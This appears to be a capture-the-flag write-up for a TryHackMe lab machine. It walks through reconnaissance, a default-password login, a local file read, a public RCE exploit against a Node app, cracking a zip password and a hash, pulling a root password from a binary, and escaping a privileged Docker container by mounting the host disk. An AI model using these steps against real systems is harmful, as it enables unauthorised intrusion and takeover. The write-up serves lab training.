<h1>Escal8 (THM) Offical WriteUp</h1>
<h3>Level : medium </h3>
<hr>

<h2>Initial Recon.</h2>
Lets start Initial enumeration with nmap !

```Scanned at 2025-01-19 05:54:29 UTC for 14s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 60 OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
80/tcp   open  http    syn-ack ttl 60 Apache httpd 2.4.62 ((Debian))
8000/tcp open  http    syn-ack ttl 60 Node.js Express framework
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.78 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (160B)
```
We see the port 22 (ssh),port  80 (http) and port 8000 (another http server which is a bit interesting)

<hr>
<h2>Port 80 enumeration.</h2>
On visiting Port 80 we see a default Apache web page.

![image](https://github.com/user-attachments/assets/a7029e76-7f27-46b4-845b-0a4bbe1a62a7)

so , i started Directory busting on this server.


```gobuster dir -u http://10.10.164.38/ -w /usr/share/wordlists/dirb/common.txt -x php -t 20
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.164.38/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 10701]
/javascript           (Status: 301) [Size: 317] [--> http://10.10.164.38/javascript/]
/login.php            (Status: 200) [Size: 1943]
/server-status        (Status: 403) [Size: 277]
Progress: 9228 / 9230 (99.98%)
===============================================================
Finished
===============================================================

```

The only useful thing from this directory Busting we get get is `login.php` , which returns a status code of `200`.
upon visiting it we see a basic , login page , i tried some basic SQLI payloads but it didnt worked , so i tried some weak credentials.
<li>admin:admin</li>
<li>admin:password</li>

Voila! we are in the dasboard , the credentials `admin:password` worked!
in the dasboard we see a File reader dasboard , so i gave a simple LFI payload. 
payload = `/etc/passwd` absolute path name which is rare now , but it worked!
![image](https://github.com/user-attachments/assets/4d0eaba9-6e53-41ee-a600-3b2116493a14)
I tried to do Apache Log poisoning but it didnt worked and i also tried to read ssh keys , still failed , and at last i tried to read some config files but got nothing useful and we hit a dead end.
Maybe it's not the way , maybe it's a rabbit hole . So i left it and noted the LFI in my notes and started Enumeration on another http port `8000`
<hr>
<h2> Port 8000 Enumeration.</h2>
Upon visiting port 8000, we see a application running .

![image](https://github.com/user-attachments/assets/ac7edc2a-d6c7-455f-bb03-4bc59c61ca12)
Now , if its a cms type application or anyother type so i tried to see its version.
![image](https://github.com/user-attachments/assets/f53312b6-3da3-49bb-971e-76da0b5b90b7)
Its Version is `1.5.3`
so , i tried to search some exploits for it.
and Voila! the application is vulnerable to unauthorized remote code execution.

Exploit: https://www.exploit-db.com/exploits/52079

so i followed the exploit Documentation and got a reverse shell.

Payload i used :-
![image](https://github.com/user-attachments/assets/e38c35d0-ef51-4453-a659-1c4a2da18ee1)
and now we got a shell!
![image](https://github.com/user-attachments/assets/40844076-be4b-4e65-bfb6-0386142e301d)

But we cant locate user.txt? upon doing `ls -al /` i noticed its a docker container due to the presence of `.dockerenv`

```
dizquetv@debian:/home/node/app$ ls -al /
ls -al /
total 92
drwxr-xr-x   1 root root 4096 Jan 17 17:47 .
drwxr-xr-x   1 root root 4096 Jan 17 17:47 ..
-rwxr-xr-x   1 root root    0 Jan 17 17:47 .dockerenv
drwxr-xr-x   1 root root 4096 Jan 18 08:49 bin
drwxr-xr-x   2 root root 4096 Apr 24  2018 boot
drwxr-xr-x  12 root root 3080 Jan 19 05:52 dev
drwxr-xr-x   1 root root 4096 Jan 18 10:44 etc
drwxr-xr-x   1 root root 4096 Jan 17 15:59 home
drwxr-xr-x   1 root root 4096 Jan 18 08:49 lib
drwxr-xr-x   2 root root 4096 Mar  1  2023 lib64
drwxr-xr-x   2 root root 4096 Mar  1  2023 media
drwxr-xr-x   2 root root 4096 Mar  1  2023 mnt
drwxr-xr-x   1 root root 4096 Jan 18 08:47 opt
dr-xr-xr-x 166 root root    0 Jan 19 05:52 proc
drwx------   1 root root 4096 Jan 18 08:50 root
drwxr-xr-x   5 root root 4096 Mar  1  2023 run
drwxr-xr-x   2 root root 4096 Mar  1  2023 sbin
drwxr-xr-x   2 root root 4096 Mar  1  2023 srv
dr-xr-xr-x  13 root root    0 Jan 19 05:51 sys
drwxrwxrwt   1 root root 4096 Jan 18 10:44 tmp
drwxr-xr-x   1 root root 4096 Mar  1  2023 usr
drwxr-xr-x   1 root root 4096 Mar  1  2023 var
dizquetv@debian:/home/node/app$ 
```
So maybe the flags are located in the host machine , so we have to escape the docker.
on looking for interesting files on the host i came to `/var/backups/` and noticed the `my-details-backup.zip` , i tried to unzip it but it was password protected , to crack it , i transferred it to my attacking machine.
and , i cracked it by `rockyou.txt` wordlist.
```
┌──(root㉿warrior)-[~/test]
└─# john hash --show                                           
my-details-backup.zip/my-details.txt:user123:my-details.txt:my-details-backup.zip::my-details-backup.zip

1 password hash cracked, 0 left
```
 inside the zip there was a details of the user file. inside that there was hashed password for the user. and i cracked it by https://crackstation.net/
 ![image](https://github.com/user-attachments/assets/250ec746-e09e-4b69-b755-9d56bb850387)
It was the same password as the ZIP file password , i tried the username `user` and the password i cracked from the hash on the ssh.
```
Linux debian 6.1.0-30-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.124-1 (2025-01-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jan 18 16:24:39 2025 from 192.168.1.4
user@debian:~$ ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
user@debian:~$ wc -c user.txt 
38 user.txt
user@debian:~$ 
```
and a small hint we get from this is that user is reusing password, and we also got user.txt
<hr>
<h2>Privilege Escalation to root.</h2>
Upon the host machine i tried every attack, SUID files , ran linpeas but found nothing , so i again went back to docker as i didnt enum it much.
i also found an interesing file on the docker , `/opt/Space_CLeaner` .

which containes a binary which cleans space ,  but whenever i run it the binary says `Authenctication Error` 
```
dizquetv@debian:/opt/Space_CLeaner$ ./clea	
./cleaner 
Auth error
```
so i did strings command on it , and found a potential Password.

```
dizquetv@debian:/opt/Space_CLeaner$ strings 	
strings cleaner 
/lib64/ld-linux-x86-64.so.2
libc.so.6
puts
__stack_chk_fail
system
__cxa_finalize
__libc_start_main
snprintf
GLIBC_2.4
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
%z	 
%r	 
%j	 
=Y	 
dH34%(
AWAVI
AUATL
[]A\A]A^A_
ROOT<REDACTED>      <- This Might pe the password of root 
apt clean && apt autoremove
echo %s | su -c "%s" > /dev/null 2>&1
cleaned
Auth error
;*3$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
```
and by entering the password in `su root` , we got root of the container.
```
root@debian:/opt/Space_CLeaner#
```

But still we didnt get root.txt , so its 100% on the host machine.
i ran `linpeas.sh` on the docker container. and found this.
![image](https://github.com/user-attachments/assets/92a0d939-3320-4f41-9c6e-911fec7fe6e8)

after seeing this , i thought the docker container might be running with `--prvileged`
so to confirm  it , i did `ls /dev/`
```
ls /dev
autofs           loop7     tty0   tty29  tty49  ttyS2        vcsu
btrfs-control    mapper    tty1   tty3   tty5   ttyS3        vcsu1
core             mem       tty10  tty30  tty50  uhid         vcsu2
cpu_dma_latency  mqueue    tty11  tty31  tty51  uinput       vcsu3
cuse             net       tty12  tty32  tty52  urandom      vcsu4
dri              null      tty13  tty33  tty53  userfaultfd  vcsu5
fb0              nvram     tty14  tty34  tty54  vcs          vcsu6
fd               port      tty15  tty35  tty55  vcs1         vcsu7
full             ppp       tty16  tty36  tty56  vcs2         vfio
fuse             psaux     tty17  tty37  tty57  vcs3         vga_arbiter
hpet             ptmx      tty18  tty38  tty58  vcs4         vhci
hwrng            pts       tty19  tty39  tty59  vcs5         vhost-net
input            random    tty2   tty4   tty6   vcs6         vhost-vsock
kmsg             rfkill    tty20  tty40  tty60  vcs7         xen
loop-control     rtc0      tty21  tty41  tty61  vcsa         xvda
loop0            shm       tty22  tty42  tty62  vcsa1        xvda1
loop1            snapshot  tty23  tty43  tty63  vcsa2        xvda2
loop2            snd       tty24  tty44  tty7   vcsa3        xvda5
loop3            stderr    tty25  tty45  tty8   vcsa4        xvdh
loop4            stdin     tty26  tty46  tty9   vcsa5        zero
loop5            stdout    tty27  tty47  ttyS0  vcsa6
loop6            tty       tty28  tty48  ttyS1  vcsa7
root@debian:/# 
```
`/dev/` contains bunch of tty's and specially `xvda` which are disks.
this indicates that the docker we are in is privileged. To escape the docker we need to know the main disk of the machine.
```
root@debian:/# fdisk -l
fdisk -l
Disk /dev/xvdh: 1 GiB, 1073741824 bytes, 2097152 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes


Disk /dev/xvda: 19 GiB, 20401094656 bytes, 39845888 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x119b123f

Device     Boot    Start      End  Sectors  Size Id Type
/dev/xvda1 *        2048 37320703 37318656 17.8G 83 Linux
/dev/xvda2      37322750 39319551  1996802  975M  5 Extended
/dev/xvda5      37322752 39319551  1996800  975M 82 Linux swap / Solaris
root@debian:/# 
```
the main disk of the Host is `xvda1`, so to gain access to host machine we need to mount it.
here are the steps :-
```
root@debian:/# mkdir /mnt/test
mkdir /mnt/test
root@debian:/# mount /dev/xvda1 /mnt/test
mount /dev/xvda1 /mnt/test
root@debian:/# cd /mnt/test/
cd /mnt/test/
root@debian:/mnt/test# ls
ls
bin   etc         initrd.img.old  lost+found  opt   run   sys  var
boot  home        lib             media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
root@debian:/mnt/test# cd root
cd root
root@debian:/mnt/test/root# ls
ls
dizquetv  root.txt
root@debian:/mnt/test/root# cat root.txt
cat root.txt
THM{REDACTED}
root@debian:/mnt/test/root# 
```

ROOTED!!
